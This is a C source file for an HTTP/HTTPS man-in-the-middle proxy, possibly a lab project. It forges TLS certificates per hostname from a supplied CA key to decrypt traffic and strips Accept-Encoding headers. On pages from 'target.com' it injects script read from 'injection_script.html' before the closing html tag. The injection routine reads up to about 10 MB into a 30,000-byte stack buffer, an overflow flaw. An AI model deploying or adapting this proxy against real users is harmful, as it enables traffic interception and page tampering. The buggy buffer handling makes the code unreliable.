#include <stdio.h>
#include <stdlib.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <netdb.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>

#include "proxy.h"
#include "connection_list.h"
#include "ssl_utils.h"

#define DEBUG printf

#define DEFAULT_PORT "80"
#define DEFAULT_SSL_PORT "443"
#define BUFFER_SIZE 0xA00000

#define TARGET_FLAG 0x1

typedef int (*generic_read)(void *, char *, int);

typedef struct Proxy {
    SOCKET sockfd;
    connection_list cl;
    X509 *ca;
    EVP_PKEY *key;
} *Proxy;

Proxy proxy_init(int port, const char *ca_filename, const char *key_filename)
{
    int optval;
         
    Proxy p = malloc(sizeof(struct Proxy));
    p->sockfd = socket(AF_INET, SOCK_STREAM, 0);
    p->cl = connection_list_init();

    optval = 1;
    setsockopt(p->sockfd, SOL_SOCKET, SO_REUSEADDR, 
	     (const void *)&optval , sizeof(int));

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);

    if (bind(p->sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("Bind");
        exit(1);
    }

    InitializeSSL();

    p->ca = LoadCertificate(ca_filename);
    p->key = LoadPrivateKey(key_filename);

    listen(p->sockfd, 5);

    DEBUG("Proxy initialized\n");

    return p;
}

void proxy_free(Proxy p)
{
    close(p->sockfd);
    connection_list_free(p->cl);
    X509_free(p->ca);
    EVP_PKEY_free(p->key);
    free(p);
    DEBUG("Proxy freed\n");
}

inline static void make_socket_non_blocking(int sockfd)
{
    int flags = fcntl(sockfd, F_GETFL, 0);
    fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);
}

static void accept_new_client(Proxy p)
{
    connection c = init_connection();

    c->fd = accept(p->sockfd, NULL, NULL);
    make_socket_non_blocking(c->fd);
    add_connection(p->cl, c);

    DEBUG("New client connected\n");
}

static void disconnect_connection(Proxy p, connection c)
{
    if (c != NULL && c->peer != NULL) {
        DEBUG("Connection closed %d\n", c->peer->fd);
        remove_connection(p->cl, c->peer);
        connection_free(c->peer);
    } 

    if (c != NULL) {
        DEBUG("Connection closed %d\n", c->fd);
        remove_connection(p->cl, c);
        connection_free(c);
    }
}

static int connect_to_server(const char* server, char *port)
{
    int err;
    int serverfd;
    struct addrinfo *servaddr;
    struct addrinfo hints = {
        .ai_family = AF_INET
    };
    
    getaddrinfo(server, port, &hints, &servaddr);

    serverfd = socket(servaddr->ai_family, 
                      servaddr->ai_socktype, 
                      servaddr->ai_protocol);

    err = connect(serverfd, servaddr->ai_addr, servaddr->ai_addrlen);
    if (err != 0) {
        perror("Server connect");
        return err;
    }

    make_socket_non_blocking(serverfd);

    DEBUG("Connected to server: %s:%s\n", server, port);

    freeaddrinfo(servaddr);
    
    return serverfd;
}

static void ssl_error(Proxy p, connection c)
{
    disconnect_connection(p, c);
}

static void init_SSL_connection(Proxy p, connection c, char *hostname)
{
    SSL *server_ssl, *client_ssl;

    if (c->using_ssl)
        return;

    DEBUG("Initializing SSL connection\n");
    printf("C-role: %d\n", c->role);
    if (c->role == 0) {
        server_ssl = CreateServerSSL(hostname, c->peer->fd);

        while (-1 == SSL_connect(server_ssl))
        {
            fd_set fds;
            FD_ZERO(&fds);
            FD_SET(c->peer->fd, &fds);

            ERR_print_errors_fp(stdout);
            printf("SSL_error: %d\n", SSL_get_error(server_ssl, -1));

            switch (SSL_get_error(server_ssl, -1))
            {
                case SSL_ERROR_WANT_READ:
                    select(c->peer->fd + 1, &fds, NULL, NULL, NULL);
                    break;
                case SSL_ERROR_WANT_WRITE:
                    select(c->peer->fd + 1, NULL, &fds, NULL, NULL);
                    break;
                default:
                    SSL_free(server_ssl);
                    ssl_error(p, c);
                    return;
            }
        }

        c->peer->ssl = server_ssl;
        c->peer->using_ssl = 1;

        X509 *cert = GenerateCertificate(hostname, p->ca, p->key);
        client_ssl = CreateClientSSL(cert, p->key, c->fd);

        DEBUG("SSL connection initialized for client\n");

        while (-1 == SSL_accept(client_ssl))
        {
            fd_set fds;
            FD_ZERO(&fds);
            FD_SET(c->fd, &fds);

            ERR_print_errors_fp(stdout);

            switch (SSL_get_error(client_ssl, -1))
            {
                case SSL_ERROR_WANT_READ:
                    select(c->fd + 1, &fds, NULL, NULL, NULL);
                    break;
                case SSL_ERROR_WANT_WRITE:
                    select(c->fd + 1, NULL, &fds, NULL, NULL);
                    break;
                default:
                    SSL_free(client_ssl);
                    X509_free(cert);
                    ssl_error(p, c);
                    return;
            }
        }

        c->ssl = client_ssl;
        c->using_ssl = 1;

        DEBUG("SSL connection initialized for client\n");

        X509_free(cert);
    }
}

static int get_method(char *message, char *method, int max_length)
{
    char *end = strstr(message, " ");
    if (end == NULL) {
        return -1;
    }

    int length = end - message > max_length - 1 ? max_length - 1 : end - message;
    strncpy(method, message, length);
    method[length] = '\0';
    return length;
}

int get_field(char *message, const char *field_name, char *field_value, int max_length)
{
    char *field = strcasestr(message, field_name);
    if (field == NULL) {
        return -1;
    }

    field += strlen(field_name);
    char *end = strcasestr(field, "\r\n");
    if (end == NULL) {
        return -1;
    }

    int length = end - field > max_length - 1 ? max_length - 1 : end - field;
    strncpy(field_value, field, length);
    field_value[length] = '\0';
    return length;
}

int set_field(struct HTTPMessage *message, const char *field_name, const char *field_value)
{
    char *header_end = strstr(message->data, "\r\n\r\n");
    if (!header_end) {
        // Invalid HTTP message
        return -1;
    }

    int field_name_len = strlen(field_name);
    int field_value_len = strlen(field_value);
    int total_field_len = field_name_len + field_value_len + 4; // "Field: Value\r\n"

    char *field_start = strcasestr(message->data, field_name);
    if (field_start && field_start < header_end) {
        // Field exists, replace its value
        char *value_start = strstr(field_start, ":");
        if (!value_start || value_start > header_end) {
            return -1;
        }
        value_start += 1;
        while (*value_start == ' ') {
            value_start++;
        }
        char *value_end = strstr(value_start, "\r\n");
        if (!value_end || value_end > header_end) {
            return -1;
        }
        int old_value_len = value_end - value_start;
        int shift = field_value_len - old_value_len;
        if (shift != 0) {
            // Adjust buffer size if necessary
            if (message->length + shift >= message->size) {
                expand_data(message);
                // Recalculate pointers after realloc
                header_end = strstr(message->data, "\r\n\r\n");
                field_start = strcasestr(message->data, field_name);
                value_start = strstr(field_start, ":") + 1;
                while (*value_start == ' ') {
                    value_start++;
                }
                value_end = value_start + old_value_len;
            }
            memmove(value_end + shift, value_end, message->length - (value_end - message->data));
            memcpy(value_start, field_value, field_value_len);
            message->length += shift;
            message->data[message->length] = '\0';
        } else {
            memcpy(value_start, field_value, field_value_len);
        }
    } else {
        // Field does not exist, add it before header end
        if (message->length + total_field_len >= message->size) {
            expand_data(message);
            // Recalculate header_end after realloc
            header_end = strstr(message->data, "\r\n\r\n");
            if (!header_end) {
                return -1;
            }
        }
        memmove(header_end + total_field_len, header_end, message->length - (header_end - message->data));
        memcpy(header_end, field_name, field_name_len);
        header_end += field_name_len;
        memcpy(header_end, ": ", 2);
        header_end += 2;
        memcpy(header_end, field_value, field_value_len);
        header_end += field_value_len;
        memcpy(header_end, "\r\n", 2);
        message->length += total_field_len;
        message->data[message->length] = '\0';
    }
    return 0;
}

static int process_target_product_page(struct HTTPMessage *message)
{
    char injected_script[30000];
    FILE *file = fopen("injection_script.html", "r");
    if (file) {
        size_t new_len = fread(injected_script, sizeof(char), BUFFER_SIZE, file);
        if (ferror(file) != 0) {
            fputs("Error reading file", stderr);
        } else {
            injected_script[new_len++] = '\0';
        }
        fclose(file);
    } else {
        fputs("Error opening file", stderr);
    }

    char *html_end = strcasestr(message->data, "</html>");
    if (html_end != NULL) {
        int script_length = strlen(injected_script);
        int new_length = message->length + script_length;

        // Expand the message if there is not enough space
        if (new_length > message->size) {
            expand_data(message);
        }

        // Insert the injected script before </html>
        memmove(html_end + script_length, html_end, message->length - (html_end - message->data));
        memcpy(html_end, injected_script, script_length);
        message->length = new_length;
        message->data[message->length] = '\0';

        // Update the Content-Length header
        char *header_end = strstr(message->data, "\r\n\r\n");
        if (header_end) {
            int body_length = message->length - (header_end - message->data) - 4;
            char content_length_str[20];
            sprintf(content_length_str, "%d", body_length);
            set_field(message, "Content-Length", content_length_str);
        }        
    }

    return 0;
}

static int process_message(Proxy p, connection c)
{
    char method[16];
    char hostname_and_port[262];
    char hostname[256];
    char port[16] = {0};
    char CONNECT_response[] = "HTTP/1.1 200 OK\r\n\r\n";
    get_method(c->message.data, method, 16);

    char *accept_encoding = strcasestr(c->message.data, "Accept-Encoding:");
    if (c->role == 0 && accept_encoding != NULL) {
        char *end = strstr(accept_encoding, "\r\n");
        if (end != NULL) {
            memmove(accept_encoding, end + 2, c->message.length - (end + 2 - c->message.data));
            c->message.length -= (end + 2 - accept_encoding);
        }
    }

    if ((strncmp(method, "GET", 3) == 0) && (strstr(c->message.data, "Host: target.com") || strstr(c->message.data, "Host: www.target.com"))) {
        c->flags |= TARGET_FLAG;
    }

    if (c->role == 1 && (c->peer->flags & TARGET_FLAG)) {
        process_target_product_page(&c->message);
        c->peer->flags &= ~TARGET_FLAG;
    }

    if (c->peer == NULL) {
        get_field(c->message.data, "Host: ", hostname_and_port, 256);
        sscanf(hostname_and_port, "%255[^:]:%15s", hostname, port);

        if (port[0] == '\0') {
            if (strcmp(method, "CONNECT") == 0)
                strcpy(port, DEFAULT_SSL_PORT);
            else
                strcpy(port, DEFAULT_PORT);
        }

        int serverfd = connect_to_server(hostname, port);
        if (serverfd < 0) {
            disconnect_connection(p, c);
            return -1;
        }
        connection server = init_connection();
        server->fd = serverfd;
        c->peer = server;
        server->peer = c;
        server->role = 1;
        add_connection(p->cl, server);

        if (strcmp(method, "CONNECT") == 0){
            DEBUG("CONNECT request\n");
            write_to_connection(c, CONNECT_response, strlen(CONNECT_response));
            init_SSL_connection(p, c, hostname);
        } else {
            write_to_connection(server, c->message.data, c->message.length);
        }
    } else {
        write_to_connection(c->peer, c->message.data, c->message.length);
    }
}

// static int read_message(connection c, char *buffer, int buffer_size)
// {
//     int bytes_read = 0;

//     if (c->using_ssl) {
//         bytes_read = SSL_read(c->ssl, buffer, buffer_size);
//         if (bytes_read <= 0) {
//             int ssl_err = SSL_get_error(c->ssl, bytes_read);
//             if (ssl_err == SSL_ERROR_WANT_READ || ssl_err == SSL_ERROR_WANT_WRITE) {
//                 return 0;
//             } else {
//                 printf("Error reading from SSL connection\n");
//                 return -1;
//             }
//         }
//         return bytes_read;
//     } else {
//         printf("c->fd: %d, c->using_ssl: %d\n", c->fd, c->using_ssl);
//         bytes_read = read(c->fd, buffer, buffer_size);
//         if (bytes_read <= 0) {
//             return -1;
//         }
//     }
// }

int proxy_run(Proxy p) 
{
    fd_set fds;
    int max_fd;
    struct timeval timeout = {0, 0};

    char *buffer = malloc(BUFFER_SIZE);
    int bytes_read;

    while(1) {
        max_fd = get_max_fd(p->cl);
        max_fd = max_fd > p->sockfd ? max_fd : p->sockfd;
        fds = get_fd_set(p->cl);
        FD_SET(p->sockfd, &fds);

        select(max_fd + 1, &fds, NULL, NULL, NULL);

        DEBUG("Select returned\n");

        if (FD_ISSET(p->sockfd, &fds))
            accept_new_client(p);

        for (int sock = 0; sock <= max_fd; sock++) {
            if (sock == p->sockfd)
                continue;
            
            if (FD_ISSET(sock, &fds)) {
                DEBUG("Data available on socket %d\n", sock);

                connection c = get_connection(p->cl, sock);

                if (c == NULL) {
                    close(sock);
                    continue;
                }

                bytes_read = read_from_connection(c, 
                                                  c->message.data + c->message.length, 
                                                  c->message.size - c->message.length);
                
                if (bytes_read < 0) {
                    disconnect_connection(p, c);
                    continue;
                }

                c->message.length += bytes_read;


                if (c->message.length == c->message.size) {
                    expand_data(&c->message);
                }

                if (is_complete(&c->message)) {
                    process_message(p, c);
                    clear_message(&c->message);
                }
            }
        }
    }
}